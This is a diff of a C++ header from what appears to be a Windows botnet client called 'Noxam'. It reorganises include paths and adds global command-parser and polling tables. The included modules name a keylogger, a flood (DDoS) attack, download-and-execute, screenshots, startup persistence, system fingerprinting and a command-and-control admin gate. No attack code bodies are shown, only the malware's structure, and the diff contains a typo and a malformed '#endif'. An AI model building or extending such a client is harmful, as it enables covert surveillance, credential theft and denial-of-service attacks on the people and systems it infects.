@@ -1,35 +1,40 @@
-#include <iostream>
+#ifndef NOXAM_NOXAMMAIN_HXX
+#define NOXAM_NOXAMMAIN_HXX
+
 #include <string>
 #include <stdio.h>
 #include <VersionHelpers.h>
 #include <windows.h>
 #Include <WinBase.h>
 
-#include "Headers/Net/NoxamHTTP.hxx"
-#include "Headers/NoxamAgressiveOptimize.hxx"
-#include "Headers/Utils/NoxamGate.hxx"
-#include "Headers/Net/NoxamNetINIT.hxx"
-#include "Headers/Crypto/NoxamWebSafeEncryption.hxx"
-#include "Headers/Crypto/NoxamStringOprations.hxx"
-#include "Headers/Crypto/NoxamURLEncoding.hxx"
-#include "Headers/Config/NoxamCommand.hxx"
-#include "Headers/SystemX/NoxamWebSiteChecker.hxx"
-#include "Headers/SystemX/NoxamOSVersionChecker.hxx"
-#include "Headers/SystemX/NoxamOSHWidChecker.hxx"
-#include "Headers/SystemX/NoxamOSCPUChecker.hxx"
-#include "Headers/SystemX/NoxamOSGPUChecker.hxx"
-#include "Headers/SystemX/NoxamOSNetVersionChecker.hxx"
-#include "Headers/CNC/NoxamPELSAdmin.hxx"
-#include "Headers/SystemX/NoxamOSGetRAM.hxx"
-#include "Headers/Utils/NoxamGateHelper.hxx"
-#include "Headers/Utils/NoxamKeyLogger.hxx"
-#include "Headers/Attack/NoxamAttackFlood.hxx"
-#include "Headers/Utils/NoxamProccess.hxx"
-#include "Headers/Utils/NoxamDownloadExecute.hxx"
-#include "Headers/Utils/NoxamScreenshot.hxx"
-#include "Headers/NoxamStartUp.hxx"
+#include "Net/NoxamHTTP.hxx"
+#include "NoxamAgressiveOptimize.hxx"
+#include "Utils/NoxamGate.hxx"
+#include "Net/NoxamNetINIT.hxx"
+#include "Crypto/NoxamWebSafeEncryption.hxx"
+#include "Crypto/NoxamStringOprations.hxx"
+#include "Crypto/NoxamURLEncoding.hxx"
+#include "Config/NoxamCommand.hxx"
+#include "SystemX/NoxamWebSiteChecker.hxx"
+#include "SystemX/NoxamOSVersionChecker.hxx"
+#include "SystemX/NoxamOSHWidChecker.hxx"
+#include "SystemX/NoxamOSCPUChecker.hxx"
+#include "SystemX/NoxamOSGPUChecker.hxx"
+#include "SystemX/NoxamOSNetVersionChecker.hxx"
+#include "CNC/NoxamPELSAdmin.hxx"
+#include "SystemX/NoxamOSGetRAM.hxx"
+#include "Utils/NoxamGateHelper.hxx"
+#include "Utils/NoxamKeyLogger.hxx"
+#include "Attack/NoxamAttackFlood.hxx"
+#include "Utils/NoxamProccess.hxx"
+#include "Utils/NoxamDownloadExecute.hxx"
+#include "Utils/NoxamScreenshot.hxx"
+#include "NoxamStartUp.hxx"
 
-using namespace std;
+bool NoxamContinuePooling = true;
+static NoxamCommandParserDelegate Parsers[500];
+static NoxamPostPollDelegate Events[500];
+int NoxamEventCount = 0;
 
 
 void NoxamRunEvents();
@@ -56,10 +61,4 @@ char* NoxamGetInitializeJoinCommand();
 void NoxamInitializePollThread();
 int WINAPI NoxamWinMain(HINSTANCE NxmIn, HINSTANCE NxmPrev, LPSTR NxmCmd, int NxmShow);
 
-
-
-int main()
-{
-    std::cout << "Bang Bang" << std::endl;
-    return 0;
-}
+#endif NOXAM_NOXAMMAIN_HXX
